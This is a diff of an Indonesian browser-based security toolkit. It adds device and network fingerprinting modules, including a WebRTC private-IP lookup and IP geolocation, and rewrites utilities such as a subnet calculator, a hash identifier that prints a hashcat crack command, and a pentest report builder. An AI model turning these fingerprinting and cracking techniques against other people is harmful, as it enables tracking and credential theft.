-3. Cek breach: haveibeenpwned.com
-4. Revoke API keys & sessions lama
-5. Cek login aktif mencurigakan
-6. Pantau email (phishing menyusul breach)
-7. Organisasi: rotasi secret semua env, log audit
-
-== ORGANISASI ==
-- GitHub Push Protection, gitleaks, trufflehog
-- Secret yang pernah masuk repo = bocor permanen, WAJIB rotasi`);bump()});
+/* ================= DEVICE (4) ================= */
+reg(V,'Full Device Report','HP/browser/OS/hardware/layar lengkap',['device'],
+async function(b,o){var u=navigator.userAgent;
+outBox(b,'UA      : '+u+'\nMobile  : '+(/Mobile/i.test(u)?'YA':'TIDAK')+'\nCPU     : '+(navigator.hardwareConcurrency||'?')+' core\nLayar   : '+screen.width+'x'+screen.height+' @'+devicePixelRatio+'x\nBahasa  : '+navigator.language+'\nTZ      : '+Intl.DateTimeFormat().resolvedOptions().timeZone+'\nTouch   : '+('ontouchstart' in window?'YA':'TIDAK'));bump()});
+reg(V,'Network Report (IP/ISP/Geo)','IP publik + private + ISP + ASN + lokasi real-time',['network'],
+async function(b,o){var d={};try{d=await(await fetch('https://ipapi.co/json/')).json()}catch(e){}
+var out='== IP PUBLIK ==\nIP    : '+(d.ip||'?')+'\nKota  : '+(d.city||'?')+' '+(d.region||'')+' '+(d.country_name||'')+'\nISP   : '+(d.org||'?')+'\nASN   : '+(d.asn||'?')+'\nMaps  : '+(d.latitude?'https://maps.google.com/?q='+d.latitude+','+d.longitude:'-');
+try{var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+pc.onicecandidate=function(e){if(e.candidate){var m=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);if(m){out+='\n\n== IP PRIVATE (WebRTC) ==\n'+m[0];pc.close()}}};
+pc.createDataChannel('x');pc.createOffer().then(function(of){return pc.setLocalDescription(of)});
+await new Promise(function(r){setTimeout(r,1500)})}catch(e){}
+outBox(b,out);bump()});
+reg(V,'Battery & Sensors','Status baterai + sensor support',['device'],
+async function(b,o){var out='';
+try{var bt=await navigator.getBattery();out+='Baterai : '+(bt.level*100).toFixed(0)+'%\nCharging: '+(bt.charging?'⚡ YA':'TIDAK')+'\n'}catch(e){out+='Battery API tidak tersedia\n'}
+out+='Online  : '+(navigator.onLine?'YA':'TIDAK')+'\nGeolocation: '+('geolocation' in navigator)+'\nMotion: '+('ondevicemotion' in window);outBox(b,out)});
+reg(V,'GPU & Codec Info','WebGL renderer + codec support',['device'],
+async function(b,o){var gl=document.createElement('canvas').getContext('webgl');
+outBox(b,'GPU     : '+(gl?gl.getParameter(gl.RENDERER):'n/a')+'\nVendor  : '+(gl?gl.getParameter(gl.VENDOR):'n/a')+'\nH.264   : '+document.createElement('video').canPlayType('video/mp4; codecs="avc1.42E01E"')+'\nVP9     : '+document.createElement('video').canPlayType('video/webm; codecs="vp9"'))});
 
 /* ================= MISC (10) ================= */
-reg(X,'Speed Test (Download)','Tes kecepatan download via fetch file uji',['net'],
-async(b,o)=>{o.textContent='Menguji...';const sizes=[1,5,10];
-try{let best=0;for(const s of sizes){const t0=performance.now();
-await fetch('https://speed.cloudflare.com/__down?bytes='+(s*1000000),{cache:'no-store'});
-const dt=(performance.now()-t0)/1000;const mbps=(s*8/dt);best=Math.max(best,mbps);}
-outBox(b,'Download: ~'+best.toFixed(1)+' Mbps\nLatency server: cepat/normal tergantung region\n\nTes lengkap: fast.com / speedtest.net')}catch(e){outBox(b,'ERR: '+e.message)}bump()});
-
-reg(X,'Ping (HTTP RTT)','Ukur round-trip-time ke target via fetch timing',['net'],
-async(b,o)=>{const u=ask('URL:','https://www.google.com');if(!u)return;
-const ts=[];for(let i=0;i<5;i++){const t0=performance.now();
-try{await fetch(u,{mode:'no-cors',cache:'no-store'})}catch{}
-ts.push(performance.now()-t0)}
-const avg=ts.reduce((a,b)=>a+b)/ts.length;
-outBox(b,'RTT percobaan: '+ts.map(t=>t.toFixed(0)+'ms').join(', ')+'\nRata-rata: '+avg.toFixed(0)+' ms\n\n💡 ICMP ping asli tidak bisa dari browser — pakai terminal:\nping -c 4 '+u.replace(/^https?:\/\//,''))bump()});
-
-reg(X,'Subnet Calculator','CIDR → netmask, range, broadcast, jumlah host',['net'],
-async(b,o)=>{const cidr=ask('CIDR (contoh 192.168.1.0/24):','192.168.1.0/24');if(!cidr)return;
-const[ip,bits]=cidr.split('/');const n=parseInt(bits);
-const ipInt=ip.split('.').reduce((a,o2)=>(a<<8)+ +o2,0);
-const mask=n===0?0:(0xFFFFFFFF<<(32-n))>>>0;
-const net=(ipInt&mask)>>>0,bc=(net|(~mask>>>0))>>>0;
-const fmt=i=>[24,16,8,0].map(s=>(i>>>s)&255).join('.');
-const hosts=n>=31?(n===32?1:2):Math.pow(2,32-n)-2;
-outBox(b,'Network   : '+fmt(net)+'/'+n+'\nNetmask   : '+fmt(mask)+'\nBroadcast : '+fmt(bc=>0?0:bc)(bc)+'\nFirst host: '+fmt(net+1)+'\nLast host : '+fmt(bc-1)+'\nHosts     : '+(n>=31?'(p2p/special)':'')+' '+(n===32?1:n>=31?2:Math.pow(2,32-n)-2));bump()});
-
-reg(X,'Hash Identifier','Identifikasi tipe hash dari panjang & format',['hash'],
-async(b,o)=>{const h=ask('Hash:','');if(!h)return;const l=h.length;
-const map={32:['MD5','NTLM','MD4'],34:['bcrypt(unsure)'],40:['SHA-1','MySQL5'],56:['SHA-224','Keccak-224'],64:['SHA-256','Keccak-256','BLAKE2s'],96:['SHA-384'],128:['SHA-512','Whirlpool'],16:['MySQL4','CRC64'],8:['CRC32']};
-outBox(b,'Panjang: '+l+'\nKandidat: '+((map[l]||[]).join(', ')||'tidak dikenal')+'\nFormat: '+(h.includes('$')?'⚠ mungkin bcrypt/argon2 ($2y$... / $argon2...)':/^[0-9]+$/.test(h)?'numerik':'hex/alnum')+'\n\nCrack lokal: hashcat -m 0 hash.txt wordlist.txt  |  john --wordlist=wordlist hash.txt')});
-
-reg(X,'Uptime Checker','Cek apakah situs up/down + respons time',['net'],
-async(b,o)=>{const list=ask('URL list (newline):','https://google.com\nhttps://example.com');if(!list)return;
-let out='';for(const u of list.split(/[\n,]+/).filter(Boolean).map(x=>x.trim()).map(x=>/^https?:/.test(x)?x:'https://'+x).slice(0,15)){
-const t0=performance.now();try{const r=await cFetch(u);out+=(r.ok?'✔ UP':'⚠ '+r.status)+'  '+u+'  ('+(performance.now()-t0).toFixed(0)+'ms)\n'}catch{out+='✘ DOWN  '+u+'\n'}}
+reg(X,'Uptime Checker','Cek up/down + respons time multi-URL',['net'],
+async function(b,o){var list=ask('URL list:','https://google.com\nhttps://example.com');if(!list)return;
+var out='';var urls=list.split(/[\n,]+/).filter(Boolean).map(function(x){return x.trim()}).map(function(x){return/^https?:/.test(x)?x:'https://'+x});
+for(var i=0;i<urls.length&&i<15;i++){var t0=performance.now();
+try{var r=await cFetch(urls[i]);out+=(r.ok?'✔ UP':'⚠ '+r.status)+'  '+urls[i]+'  ('+(performance.now()-t0).toFixed(0)+'ms)\n'}catch(e){out+='✘ DOWN  '+urls[i]+'\n'}}
 outBox(b,out);bump()});
-
-reg(X,'Password Strength Analyzer','Analisis kekuatan password: entropy, pola, waktu crack',['password'],
-async(b,o)=>{const p=ask('Password:','');if(p===null)return;
-let pool=0;if(/[a-z]/.test(p))pool+=26;if(/[A-Z]/.test(p))pool+=26;if(/\d/.test(p))pool+=10;if(/[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(p))pool+=32;
-const ent=p.length*Math.log2(pool||1);
-const guesses=Math.pow(pool||1,p.length);const secs=guesses/1e10;
-const y=secs/31536000;
-let warn='';if(p.length<12)warn+='⚠ terlalu pendek (<12)\n';if(!/[A-Z]/.test(p))warn+='⚠ tanpa huruf besar\n';if(!/\d/.test(p))warn+='⚠ tanpa angka\n';if(/^[a-zA-Z]+$/.test(p))warn+='⚠ hanya huruf\n';if(/(1234|password|qwerty|admin)/i.test(p))warn+='⚠ pola umum terdeteksi!\n';
-outBox(b,'Panjang : '+p.length+'\nPool    : '+pool+'\nEntropy : '+ent.toFixed(1)+' bits\n'+'Waktu crack (10 GH/s): '+(y>1e6?'jutaan tahun 😊':y>1?y.toFixed(1)+' tahun':(secs||1).toFixed(1)+' detik ⚠')+'\n\n'+(warn||'✔ struktur bagus')+'\nRekomendasi: ≥16 char, passphrase 4 kata random')});
-
-reg(X,'IP Range to CIDR','Konversi range IP → daftar CIDR',['net'],
-async(b,o)=>{outBox(b,`IP range → CIDR (panduan & tools):
-
-== ONLINE ==
-→ https://www.ipaddressguide.com/cidr
-→ https://www.subnetcalculator.info/
-
-== CLI ==
-ipcalc 192.168.1.0/24
-sipcalc 10.0.0.0/8
-prips 192.168.1.0/24    → list semua IP
-
-== FORMULA ==
-Host per subnet = 2^(32-prefix) - 2
-Contoh /24 = 254 host, /16 = 65.534 host`)});
-
-reg(X,'Random Data / Token Generator','Generate API token, key, salt (crypto secure)',['dev'],
-async(b,o)=>{const len=parseInt(ask('Panjang token:','32'))||32;const n=parseInt(ask('Jumlah:','5'))||5;
-const cs='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';const out=[];
-for(let i=0;i<n;i++){const arr=new Uint32Array(len);crypto.getRandomValues(arr);
-out.push([...arr].map(x=>cs[x%cs.length]).join(''))}
-outBox(b,out.join('\n')+'\n\nHex 256-bit: '+[...crypto.getRandomValues(new Uint8Array(32))].map(x=>x.toString(16).padStart(2,'0')).join(''));bump()});
-
-reg(X,'Report Builder (Markdown)','Buat laporan pentest/OSINT terstruktur + download MD',['report'],
-async(b,o)=>{const target=ask('Target/scope:','example.com');const findings=ask('Findings (pisah ;):','Exposed .env; Weak CSP; Subdomain leak')||'';
-const sev=ask('Severity (Critical;High;Medium):','High;Medium;Low')||'';
-const f=findings.split(';').map(x=>x.trim()).filter(Boolean);
-const s=sev.split(';').map(x=>x.trim());
-const md='# Laporan Pengujian — M4zk1pL4y ToolS v7.0\n\n**Target:** '+target+'\n**Tanggal:** '+new Date().toISOString()+'\n**Tester:** [nama]\n**Otorisasi:** [ref. surat izin]\n\n## Ringkasan\n| # | Temuan | Severity |\n|---|--------|----------|\n'+f.map((x,i)=>'| '+(i+1)+' | '+x+' | '+(s[i]||'-')+' |').join('\n')+'\n\n## Detail\n'+f.map((x,i)=>'### '+(i+1)+'. '+x+' ['+(s[i]||'-')+']\n- **Endpoint:** \n- **PoC:** \n- **Dampak:** \n- **Rekomendasi:** \n').join('\n');
+reg(X,'Speed Test Download','Tes kecepatan download via Cloudflare',['net'],
+async function(b,o){o.textContent='Menguji...';
+try{var t0=performance.now();await fetch('https://speed.cloudflare.com/__down?bytes=5000000',{cache:'no-store'});
+var dt=(performance.now()-t0)/1000;outBox(b,'~'+(5*8/dt).toFixed(1)+' Mbps (5MB sample)\n\nTes lengkap: fast.com')}catch(e){outBox(b,'ERR: '+e.message)}bump()});
+reg(X,'HTTP Ping (RTT)','Ukur round-trip-time ke target',['net'],
+async function(b,o){var u=ask('URL:','https://www.google.com');if(!u)return;
+var ts=[];for(var i=0;i<5;i++){var t0=performance.now();try{await fetch(u,{mode:'no-cors',cache:'no-store'})}catch(e){}ts.push(performance.now()-t0)}
+outBox(b,'RTT: '+ts.map(function(t){return t.toFixed(0)+'ms'}).join(', ')+'\nAvg: '+(ts.reduce(function(a,b){return a+b})/ts.length).toFixed(0)+' ms\n\nICMP ping asli: ping -c 4 '+u.replace(/^https?:\/\//,''));bump()});
+reg(X,'Subnet Calculator','CIDR → netmask/range/broadcast/host',['net'],
+async function(b,o){var cidr=ask('CIDR:','192.168.1.0/24');if(!cidr)return;
+var p=cidr.split('/'),ip=p[0],n=parseInt(p[1]);
+var ipInt=ip.split('.').reduce(function(a,x){return(a<<8)+ +x},0);
+var mask=n===0?0:(0xFFFFFFFF<<(32-n))>>>0;
+var net=(ipInt&mask)>>>0,bc=(net|(~mask>>>0))>>>0;
+var fmt=function(i){return[24,16,8,0].map(function(s){return(i>>>s)&255}).join('.')};
+outBox(b,'Network   : '+fmt(net)+'/'+n+'\nNetmask   : '+fmt(mask)+'\nBroadcast : '+fmt(bc)+'\nFirst     : '+fmt(net+1)+'\nLast      : '+fmt(bc-1)+'\nHosts     : '+(n>=31?'(special)':Math.pow(2,32-n)-2))});
+reg(X,'Hash Identifier','Identifikasi tipe hash',['hash'],
+async function(b,o){var h=ask('Hash:','');if(!h)return;
+var map={32:'MD5/NTLM',40:'SHA-1',56:'SHA-224',64:'SHA-256',96:'SHA-384',128:'SHA-512',8:'CRC32'};
+outBox(b,'Panjang : '+h.length+'\nKandidat: '+(map[h.length]||'tidak dikenal')+'\nFormat  : '+(h.indexOf('$')>-1?'⚠ bcrypt/argon2':/^[0-9a-f]+$/i.test(h)?'hex':'alnum')+'\n\nCrack: hashcat -m 0 hash.txt wordlist.txt')});
+reg(X,'Password Strength Analyzer','Entropy + waktu crack password',['password'],
+async function(b,o){var p=ask('Password:','');if(p===null)return;
+var pool=0;if(/[a-z]/.test(p))pool+=26;if(/[A-Z]/.test(p))pool+=26;if(/\d/.test(p))pool+=10;if(/[^a-zA-Z0-9]/.test(p))pool+=32;
+var ent=p.length*Math.log2(pool||1);
+outBox(b,'Panjang : '+p.length+'\nPool    : '+pool+'\nEntropy : '+ent.toFixed(1)+' bits\nEstimasi crack (10GH/s): '+(Math.pow(2,ent)/1e10/31536000).toFixed(1)+' tahun\n\n'+(p.length<12?'⚠ terlalu pendek\n':'')+(pool<70?'⚠ variasi karakter kurang\n':'')+(/(1234|password|qwerty|admin)/i.test(p)?'⚠ POLA UMUM!':'✔ struktur oke'))});
+reg(X,'Token Generator','Generate API token crypto-secure',['dev'],
+async function(b,o){var len=parseInt(ask('Panjang:','32'))||32;var n=parseInt(ask('Jumlah:','5'))||5;
+var cs='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';var out=[];
+for(var i=0;i<n;i++){var a=new Uint32Array(len);crypto.getRandomValues(a);out.push(Array.from(a).map(function(x){return cs[x%cs.length]}).join(''))}
+outBox(b,out.join('\n'));bump()});
+reg(X,'Report Builder (Markdown)','Buat laporan pentest + download MD',['report'],
+async function(b,o){var target=ask('Target:','example.com');var f=(ask('Findings (;):','Exposed .env; Weak CSP')||'').split(';').filter(Boolean);
+var md='# Laporan — M4zk1pL4y ToolS v7.1\n\n**Target:** '+target+'\n**Tanggal:** '+new Date().toISOString()+'\n\n## Temuan\n'+f.map(function(x,i){return (i+1)+'. '+x.trim()+' [severity: ___]\n   - Endpoint:\n   - PoC:\n   - Rekomendasi:'}).join('\n');
 outBox(b,md);dload('laporan-'+target.replace(/\W+/g,'-')+'.md',md)});
+reg(X,'Session Export','Export semua data lokal ke JSON',['backup'],
+async function(b,o){var data={};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);data[k]=localStorage.getItem(k)}
+outBox(b,JSON.stringify(data,null,2));dload('m4zk-session-'+Date.now()+'.json',JSON.stringify(data,null,2))});
+reg(X,'QR Code Generator','QR code + download PNG',['qr'],
+async function(b,o){var t=prompt('Teks/URL:');if(t==null)return;
+var c=document.createElement('canvas');QRCode.toCanvas(c,t,{width:280,color:{dark:'#00ff41',light:'#000'}},function(err){
+if(err){outBox(b,'ERR: '+err);return}
+var box=outBox(b,'');c.style.maxWidth='100%';box.appendChild(c);
+var a=document.createElement('a');a.download='qr.png';a.href=c.toDataURL();a.textContent='⬇ Download PNG';a.style.cssText='display:block;margin-top:8px;color:#00ff41';box.appendChild(a)});bump()});
+reg(X,'JSON Formatter','Beautify & validate JSON',['json'],
+async function(b,o){var t=prompt('JSON:');if(t==null)return;
+try{outBox(b,JSON.stringify(JSON.parse(t),null,2))}catch(e){outBox(b,'JSON INVALID: '+e.message)}bump()});
+reg(X,'Timestamp Converter','Unix ↔ tanggal',['time'],
+async function(b,o){var t=prompt('Unix (kosong = now):','')||Math.floor(Date.now()/1000);
+outBox(b,'Unix: '+t+'\nTanggal: '+new Date(parseInt(t)*1000).toLocaleString('id-ID')+'\nISO: '+new Date(parseInt(t)*1000).toISOString());bump()});
 
-reg(X,'Session Data Export','Export SEMUA riwayat & setting suite ini ke JSON',['backup'],
-async(b,o)=>{const data={};for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);data[k]=localStorage.getItem(k)}
-outBox(b,JSON.stringify(data,null,2));dload('m4zk1pL4y-session-'+Date.now()+'.json',JSON.stringify(data,null,2))});
-
-/* ============ RENDER & ROUTER ============ */
-const CATS=['ALL','OSINT','RECON','DORK','SQLI','HTTP','SUBD','CRYPTO','ENCODE','WEBDEV','CODE','APK','DEVICE','LEAK','MISC'];
-let curCat='ALL',curQ='';
-function renderNav(){$('nav').innerHTML=CATS.map(c=>`<div class="tab ${c===curCat?'act':''}" onclick="openCat('${c}')">${c}</div>`).join('')}
+/* ============ RENDER ============ */
+var CATS=['ALL','OSINT','RECON','DORK','SQLI','HTTP','SUBD','CRYPTO','ENCODE','CODE','APK','DEVICE','LEAK','MISC'];
+var curCat='ALL',curQ='';
+function renderNav(){var nav=$('nav');if(!nav)return;nav.innerHTML=CATS.map(function(c){return '<div class="tab'+(c===curCat?' act':'')+'" onclick="openCat(\''+c+'\')">'+c+'</div>'}).join('')}
 function openCat(c){curCat=c;renderNav();renderGrid()}
-function renderGrid(){
-  const q=curQ.toLowerCase();
-  const list=TOOLS.filter(t=>(curCat==='ALL'||t.cat===curCat)&&(!q||(t.name+t.desc+t.tags.join(' ')).toLowerCase().includes(q)));
-  $('grid').innerHTML=list.length?list.map(t=>{
-    const i=TOOLS.indexOf(t);
-    return `<div class="card" onclick="runTool(${i})"><h3>[${t.cat}] ${esc(t.name)}</h3><p>${esc(t.desc)}</p><div class="tag">${t.tags.map(x=>'#'+x).join(' ')}</div></div>`
-  }).join(''):'<div class="card"><h3>[!] Tidak ada hasil</h3><p>Coba kata kunci lain</p></div>';
-  $('st-mod').textContent=TOOLS.length}
-function runTool(i){const t=TOOLS[i];if(!t)return;
-  $('mTitle').textContent='['+t.cat+'] '+t.name;
-  $('mBody').innerHTML='<p style="color:var(--dim);font-size:12px">'+esc(t.desc)+'</p><div id="work"></div>';
-  $('modal').classList.add('open');
-  t.run($('mBody'),$('mBody').querySelector('#work'))}
+function renderGrid(){var g=$('grid');if(!g)return;var q=curQ.toLowerCase();
+var list=TOOLS.filter(function(t){return(curCat==='ALL'||t.cat===curCat)&&(!q||(t.name+t.desc).toLowerCase().indexOf(q)>-1)});
+g.innerHTML=list.length?list.map(function(t){return '<div class="card" onclick="runTool('+TOOLS.indexOf(t)+')"><h3>['+t.cat+'] '+esc(t.name)+'</h3><p>'+esc(t.desc)+'</p></div>'}).join(''):'<div class="card"><h3>[!] Tidak ada hasil</h3></div>';
+$('st-mod').textContent=TOOLS.length}
+function runTool(i){var t=TOOLS[i];if(!t)return;
+$('mTitle').textContent='['+t.cat+'] '+t.name;
+$('mBody').innerHTML='<p style="color:var(--dim);font-size:12px">'+esc(t.desc)+'</p><div id="work"></div>';
+$('modal').classList.add('open');
+Promise.resolve(t.run($('mBody'),$('mBody').querySelector('#work'))).catch(function(e){toast('[ERR] '+e.message,1)})}
 function closeModal(){$('modal').classList.remove('open')}
-$('search').oninput=e=>{curQ=e.target.value;renderGrid()};
-$('search').addEventListener('keydown',e=>{if(e.key==='Enter'){const t=TOOLS.find(t=>(t.name+t.desc).toLowerCase().includes(curQ.toLowerCase()));if(t)runTool(TOOLS.indexOf(t))}});
-addEventListener('keydown',e=>{if((e.ctrlKey||e.metaKey)&&e.key==='k'){e.preventDefault();$('search').focus()}if(e.key==='Escape')closeModal()});
-
-function boot(){renderNav();renderGrid();$('st-mod').textContent=TOOLS.length;
-  $('st-scan').textContent=localStorage.getItem('mzk_run')||0;
-  toast('[SYS] '+TOOLS.length+' modul aktif — M4zk1pL4y v7.0 siap')}
+window.openCat=openCat;window.runTool=runTool;window.closeModal=closeModal;
+$('search').addEventListener('input',function(e){curQ=e.target.value;renderGrid()});
+$('search').addEventListener('keydown',function(e){if(e.key==='Enter'){var t=TOOLS.find(function(t){return(t.name+t.desc).toLowerCase().indexOf(curQ.toLowerCase())>-1});if(t)runTool(TOOLS.indexOf(t))}});
+addEventListener('keydown',function(e){if((e.ctrlKey||e.metaKey)&&e.key==='k'){e.preventDefault();$('search').focus()}if(e.key==='Escape')closeModal()});
+window.mzkBoot=function(){renderNav();renderGrid();$('st-mod').textContent=TOOLS.length;
+$('st-scan').textContent=localStorage.getItem('mzk_run')||0;
+toast('[SYS] '+TOOLS.length+' modul aktif — v7.1 siap')};
+}catch(e){/* biar block 1 tetap bisa jalan */ console.error(e)}
 </script>
 </body>
 </html>
